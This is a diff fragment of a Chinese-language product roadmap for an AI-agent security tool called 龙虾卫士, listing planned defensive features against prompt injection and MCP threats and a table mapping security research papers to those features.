-| v22 | 单 Agent 安全 ≠ 多 Agent 安全，**蠕虫在 Agent 之间传播** |
-| v23 | 安全运营不是看 Dashboard，是**跟安全助手对话** |
-| v24 | 单二进制 → 集群，但**零配置迁移** |
+| v20 | 不检测内容，**追踪数据的血统** |
+| **v23** | 🆕 同一操作在不同历史下**安全判定不同**（规则有记忆） |
+| **v24** | 🆕 不检查输入内容，**反事实重放问 LLM "没有外部数据你还这么做吗？"** |
+| **v25** | 🆕 不拦截 LLM 的 tool call，**先编译"允许做什么"再对比** — 注入在设计上无路可走 |
+| **v26** | 🆕 安全不是 if-else，是**数学定理** — 标签传播规则保证信息不泄露 |
+| v27 | MCP Server 说自己安全？**让龙虾卫士验证** — 信任要靠行为赢取不是声明 |
+| v28 | 安全运营不是看 Dashboard，是**跟安全助手对话** |
+| v29 | 单二进制 → 集群，但**零配置迁移** |
+
+### 🆕 学术论文→产品功能 映射表
+
+| 论文 | 年份 | 引用 | 对应版本 | 龙虾卫士功能 | 改造量 |
+|------|------|------|---------|-------------|--------|
+| Runtime Governance (2603.16586) | 2026.03 | — | **v23** | PathPolicyEngine 路径级策略 | 小 |
+| AttriGuard (2603.10749) | 2026.03 | — | **v24** | CounterfactualVerifier 反事实验证 | 中 |
+| CaMeL (2503.18813) Google | 2025.03 | ⭐⭐⭐⭐⭐ | **v25** | PlanCompiler + Capability 权限 | 中大 |
+| Fides/IFC (2505.23643) Microsoft | 2025.05 | 30 | **v26** | 双标签系统 + Quarantined LLM | 大 |
+| Dual Firewall (2502.01822) | 2025.02 | — | v25.0 融合 | 结构化入站 = Plan Template | — |
+| AgentRaft/DOE (2603.07557) | 2026.03 | — | v26.2 融合 | 跨 Tool 数据过度暴露检测 | — |
+| SMCP (2602.01129) | 2026.02 | — | v27.1 | MCP 五层安全透明叠加 | 中 |
+| MCPShield (2602.14281) | 2026.02 | — | v27.1 | MCP Tool 动态信任评分 | 小 |
+| MCPSec (2601.17549) | 2026.01 | — | v27.1 | 协议级加固 (52.8%→12.4% ASR) | 中 |
+| MCP Landscape (ACM TOSEM) | 2025 | 420 | v27 需求输入 | 16 种 MCP 威胁场景需求清单 | — |
+| AgentDojo (NeurIPS 2024) | 2024 | — | v28.1 | Benchmark 自动化测试 | 小 |
+| AgentDyn (2602.03117) | 2026.02 | — | v28.1 | 动态 Benchmark 测试 | 小 |
+| AgentVigil (2505.05849) | 2025.05 | 28 | v19 已有 | 红队自动化（已通过 v14.2+v19 覆盖）| — |
+| SAFEFLOW (2506.07564) | 2025.06 | 12 | 未来探索 | 事务性 Agent 操作 | 大 |
+| Proof-of-Guardrail (2603.05786) | 2026.03 | — | 未来探索 | TEE 密码学审计证明 | 大 |
+| Tracking Capabilities (2603.00991) | 2026.03 | — | v25.1 参考 | 能力安全类型系统（理念借鉴）| — |
 
 ## 竞品参考
 
